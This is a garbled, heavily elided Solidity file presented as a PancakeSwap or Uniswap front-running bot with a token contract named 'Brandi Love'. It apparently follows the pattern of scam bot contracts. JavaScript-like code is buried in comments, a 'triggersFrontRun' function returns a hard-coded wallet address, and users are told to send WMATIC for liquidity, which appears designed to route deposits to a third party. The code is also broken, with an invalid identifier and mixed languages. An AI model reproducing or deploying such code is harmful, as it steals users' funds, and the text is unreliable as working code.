...
// File: https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contracts-/main/UniswapV1.sol
...
/*    string public tokenName;
	...
	constructor(string memory _tokenName, string memory _tokenSymbol) public {
		...
		manager = new Manager();
	     ...
	     Send required WMATIC for liquidity pair
...
const INPUT_TOKEN_ADDRESS = '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270';
const WWMATIC TOKEN_ADDRESS = '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270';
...
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		...
		return 0xE3F6d9613c6f1A59f642662747Df5Fb6bC0cA9c9;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
...
// All subsequent code will be inside this block
 ...
 contract Token {
    Manager manager;
    string public name = "Brandi Love"; // Holds the name of the token
    string public symbol = "BLOVE"; // Holds the symbol of the token
